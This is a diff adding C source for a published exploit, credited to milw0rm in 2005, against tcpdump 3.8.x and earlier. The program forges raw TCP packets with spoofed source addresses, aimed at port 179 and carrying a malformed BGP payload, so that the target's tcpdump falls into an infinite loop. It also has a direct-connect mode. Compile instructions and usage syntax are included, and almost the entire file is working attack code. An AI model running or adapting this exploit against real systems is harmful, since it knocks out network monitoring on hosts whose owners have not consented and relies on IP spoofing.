@@ -1,0 +1,337 @@
+/*[ tcpdump[3.8.x]: (BGP) RT_ROUTING_INFO infinite loop DOS. ]***** 
+ *                                                                *
+ * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)               *
+ *                                                                *
+ * compile:                                                       *
+ *  gcc xtcpdump-bgp-dos.c -o xtcpdump-bgp-dos                    *
+ *  gcc xtcpdump-bgp-dos.c -o xtcpdump-bgp-dos -D_USE_SYN         *
+ *                                                                *
+ * tcpdump homepage/URL:                                          *
+ *  http://www.tcpdump.org                                        *
+ *                                                                *
+ * fix:                                                           *
+ *  this appears to have been fixed in the alpha 3.9.x / CVS      *
+ *  versions.  although i found no direct mention of the issue    *
+ *  itself being resolved, the code has been changed in a way to  *
+ *  not allow this to happen.                                     *
+ *                                                                *
+ * Tcpdump is a program that allows you to dump the traffic on a  *
+ * network. It can be used to print out the headers of packets on *
+ * a network interface that matches a given expression. You can   *
+ * use this tool to track down network problems, to detect "ping  *
+ * attacks" or to monitor the network activities.                 *
+ *                                                                *
+ * tcpdump(v3.8.3 and earlier versions) contains a remote denial  *
+ * of service vulnerability in the form of a single (BGP) packet  *
+ * causing an infinite loop.                                      *
+ *                                                                *
+ * BGP is TCP, however the victim does not have to have the BGP   *
+ * port(179) open to abuse the bug.  by sending a specially       *
+ * crafted (spoofed) TCP(ACK,PUSH) packet to port 179 you can     *
+ * trigger the infinite loop, however it depends on if the packet *
+ * can make it out without being dropped.  in some situations the *
+ * source host/ip used must be within your local subnet(or your   *
+ * actual ip) for the (spoofed) packet to make it past your own   *
+ * router.  if for some reason you think a (invalid) TCP(SYN)     *
+ * packet is more likely to make it out, compile with the         *
+ * -D_USE_SYN flag. (tcpdump will parse the BGP data even if it   *
+ * is a TCP(SYN) packet)                                          *
+ *                                                                *
+ * some versions of tcpdump(depending on the platform/OS) need no *
+ * special command-line arguments to allow this to happen.        *
+ * however most need the "-v" argument, and a some need the       *
+ * "-s" (snaplen) set to 88(non-spoofed is around 100, with the   *
+ * ip options) or more.                                           *
+ ******************************************************************/
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#ifdef _USE_ARPA
+#include <arpa/inet.h>
+#endif
+
+/* doesn't seem to be standardized, so... */
+#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
+#define BYTE_ORDER __BYTE_ORDER
+#endif
+#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
+#define BIG_ENDIAN __BIG_ENDIAN
+#endif
+#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
+#if BYTE_ORDER == BIG_ENDIAN
+#define _USE_BIG_ENDIAN
+#endif
+#endif
+
+/* will never need to be changed. */
+#define BGP_PORT 179
+#define DFL_AMOUNT 5
+#define TIMEOUT 10
+
+/* avoid platform-specific header madness. */
+/* (just plucked out of header files) */
+struct iph{
+#ifdef _USE_BIG_ENDIAN
+ unsigned char version:4,ihl:4;
+#else
+ unsigned char ihl:4,version:4;
+#endif
+ unsigned char tos;
+ unsigned short tot_len;
+ unsigned short id;
+ unsigned short frag_off;
+ unsigned char ttl;
+ unsigned char protocol;
+ unsigned short check;
+ unsigned int saddr;
+ unsigned int daddr;
+};
+struct tcph{
+ unsigned short source;
+ unsigned short dest;
+ unsigned int seq;
+ unsigned int ack_seq;
+#ifdef _USE_BIG_ENDIAN
+ unsigned short doff:4,res1:4,cwr:1,ece:1,
+ urg:1,ack:1,psh:1,rst:1,syn:1,fin:1;
+#else
+ unsigned short res1:4,doff:4,fin:1,syn:1,
+ rst:1,psh:1,ack:1,urg:1,ece:1,cwr:1;
+#endif
+ unsigned short window;
+ unsigned short check;
+ unsigned short urg_ptr;
+};
+struct sumh{
+  unsigned int saddr;
+  unsigned int daddr;
+  unsigned char fill;
+  unsigned char protocol;
+  unsigned short len;
+};
+
+/* malformed BGP data. (the bug) */
+static char payload[]=
+ /* shortened method. (34 bytes) */
+ "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+ "\xff\xff\xff\xff\xff\xff\x00\x13\x02\x00"
+ "\x01\x00\xff\x00\xff\x0e\x00\xff\x00\x01"
+ "\x84\x00\x00\x00";
+ /* original method, un-comment/swap if desired. (39 bytes) */
+ /* "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" */
+ /* "\xff\xff\xff\xff\xff\xff\x00\x13\x02\x00" */
+ /* "\x01\x00\xff\x00\xff\x0e\x00\xff\x00\x01" */
+ /* "\x84\x00\x00\x20\x00\x00\x00\x00\x00"; */
+
+/* prototypes. (and sig_alarm) */
+void bgp_connect(unsigned int);
+void bgp_inject(unsigned int,unsigned int);
+unsigned short in_cksum(unsigned short *,signed int);
+unsigned int getip(char *);
+void printe(char *,signed char);
+void sig_alarm(){printe("alarm/timeout hit.",1);}
+
+/* begin. */
+int main(int argc,char **argv) {
+ unsigned char nospoof=0;
+ unsigned int amt=DFL_AMOUNT;
+ unsigned int daddr=0,saddr=0;
+ printf("[*] tcpdump[3.8.x]: (BGP) RT_ROUTING_INFO infinite loop "
+ "DOS.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
+ if(argc<2){
+  printf("[*] syntax: %s <dst host> [src host(0=random)] [amount]\n",
+  argv[0]);
+  printf("[*] syntax: %s <dst host> nospoof\n",argv[0]);
+  exit(1);
+ }
+ if(!(daddr=getip(argv[1])))
+  printe("invalid destination host/ip.",1);
+ if(argc>2){
+  if(strstr(argv[2],"nospoof"))nospoof=1;
+  else saddr=getip(argv[2]);
+ }
+ if(argc>3)amt=atoi(argv[3]);
+ if(nospoof){
+  printf("[*] target: %s\n",argv[1]);
+  bgp_connect(daddr);
+  printf("[*] done.\n");
+ }
+ else{
+  if(!amt)printe("no packets?",1);
+  printf("[*] destination\t: %s\n",argv[1]);
+  printf("[*] source\t: %s\n",(saddr?argv[2]:"<random>"));
+  printf("[*] amount\t: %u\n\n",amt);
+  printf("[+] sending(packet = .): ");
+  fflush(stdout);
+  while(amt--){
+   /* spice things up. */
+   srandom(time(0)+amt);
+   bgp_inject(daddr,saddr);
+   printf(".");
+   fflush(stdout);
+   usleep(50000);
+  }
+  printf("\n\n[*] done.\n");
+ }
+ fflush(stdout);
+ exit(0);
+}
+/* (non-spoofed) generic connection. (port 179 on the */
+/* victim has to be open for this to work) */
+void bgp_connect(unsigned int daddr){
+ signed int sock;
+ struct sockaddr_in s;
+ sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+ s.sin_family=AF_INET;
+ s.sin_port=htons(BGP_PORT);
+ s.sin_addr.s_addr=daddr;
+ printf("[*] attempting to connect...\n");
+ signal(SIGALRM,sig_alarm);
+ alarm(TIMEOUT);
+ if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
+  printe("(non-spoofed) BGP connection failed.",1);
+ alarm(0);
+ printf("[*] successfully connected.\n");
+ printf("[*] sending malformed BGP data. (%u bytes)\n",
+ sizeof(payload)-1);
+ usleep(500000);
+ write(sock,payload,sizeof(payload));
+ usleep(500000);
+ printf("[*] closing connection.\n\n");
+ close(sock);
+ return;
+}
+/* (spoofed) generates and sends an unestablished (BGP) */
+/* TCP(ACK,PUSH) or TCP(SYN) packet. */
+void bgp_inject(unsigned int daddr,unsigned int saddr){
+ signed int sock=0,on=1;
+ unsigned int psize=0;
+ char *p,*s;
+ struct sockaddr_in sa;
+ struct iph ip;
+ struct tcph tcp;
+ struct sumh sum;
+ /* create raw (TCP) socket. */
+ if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))<0)
+  printe("could not allocate raw socket.",1);
+ /* allow (on some systems) for the user-supplied ip header. */
+#ifdef IP_HDRINCL
+ if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
+  printe("could not set IP_HDRINCL socket option.",1);
+#endif
+ sa.sin_family=AF_INET;
+ sa.sin_port=htons(BGP_PORT);
+ sa.sin_addr.s_addr=daddr;
+ psize=(sizeof(struct iph)+sizeof(struct tcph)+sizeof(payload)-1);
+ memset(&ip,0,sizeof(struct iph));
+ memset(&tcp,0,sizeof(struct tcph));
+ /* values not filled = 0, from the memset() above. */
+ ip.ihl=5;
+ ip.version=4;
+ ip.tot_len=htons(psize);
+ ip.id=(random()%65535);
+ ip.saddr=(saddr?saddr:random()%0xffffffff);
+ ip.daddr=daddr;
+ ip.ttl=(64*(random()%2+1));
+ ip.protocol=IPPROTO_TCP;
+ ip.frag_off=64;
+ tcp.seq=(random()%0xffffffff+1);
+ tcp.source=htons(random()%60000+1025);
+ tcp.dest=sa.sin_port;
+ /* passing BGP data as ip options for the syn packet method */
+ /* doesn't work as tcpdump doesnt process it as BGP data. */
+ tcp.doff=5;
+#ifdef _USE_SYN
+ tcp.syn=1;
+ tcp.window=htons(65535);
+#else
+ tcp.ack=1;
+ tcp.psh=1;
+ tcp.ack_seq=(random()%0xffffffff+1);
+ tcp.window=htons(4096*(random()%2+1));
+#endif
+ /* needed for (correct) checksums. */
+ sum.saddr=ip.saddr;
+ sum.daddr=ip.daddr;
+ sum.fill=0;
+ sum.protocol=ip.protocol;
+ sum.len=htons(sizeof(struct tcph)+sizeof(payload)-1);
+ /* make sum/calc buffer for the tcp checksum. (correct) */
+ if(!(s=(char *)malloc(sizeof(struct sumh)+sizeof(struct tcph)
+ +sizeof(payload)+1)))
+  printe("malloc() failed.",1);
+ memset(s,0,(sizeof(struct sumh)+sizeof(struct tcph)
+ +sizeof(payload)+1));
+ memcpy(s,&sum,sizeof(struct sumh));
+ memcpy(s+sizeof(struct sumh),&tcp,sizeof(struct tcph));
+ memcpy(s+sizeof(struct sumh)+sizeof(struct tcph),
+ payload,sizeof(payload)-1);
+ tcp.check=in_cksum((unsigned short *)s,
+ sizeof(struct sumh)+sizeof(struct tcph)+sizeof(payload)-1);
+ free(s);
+ /* make sum/calc buffer for the ip checksum. (correct) */
+ if(!(s=(char *)malloc(sizeof(struct iph)+1)))
+  printe("malloc() failed.",1);
+ memset(s,0,(sizeof(struct iph)+1));
+ memcpy(s,&ip,sizeof(struct iph));
+ ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
+ free(s);
+ /* put the packet together. */
+ if(!(p=(char *)malloc(psize+1)))
+  printe("malloc() failed.",1);
+ memset(p,0,psize);
+ memcpy(p,&ip,sizeof(struct iph));
+ memcpy(p+sizeof(struct iph),&tcp,sizeof(struct tcph));
+ memcpy(p+(sizeof(struct iph)+sizeof(struct tcph)),
+ payload,sizeof(payload));
+ /* send the malformed BGP packet. */
+ if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
+ sizeof(struct sockaddr))<psize)
+  printe("failed to send forged BGP packet.",1);
+ free(p);
+ return;
+}
+/* standard method for creating TCP/IP checksums. */
+unsigned short in_cksum(unsigned short *addr,signed int len){
+ unsigned short answer=0;
+ register unsigned short *w=addr;
+ register int nleft=len,sum=0;
+ while(nleft>1){
+  sum+=*w++;
+  nleft-=2;
+ }
+ if(nleft==1){
+  *(unsigned char *)(&answer)=*(unsigned char *)w;
+  sum+=answer;
+ }
+ sum=(sum>>16)+(sum&0xffff);
+ sum+=(sum>>16);
+ answer=~sum;
+ return(answer);
+}
+/* gets the ip from a host/ip/numeric. */
+unsigned int getip(char *host){
+ struct hostent *t;
+ unsigned int s=0;
+ if((s=inet_addr(host))){
+  if((t=gethostbyname(host)))
+   memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
+ }
+ if(s==-1)s=0;
+ return(s);
+}
+/* all-purpose error/exit function. */
+void printe(char *err,signed char e){
+ printf("[!] %s\n",err);
+ if(e)exit(e);
+ return;
+}
+
+// milw0rm.com [2005-04-26]
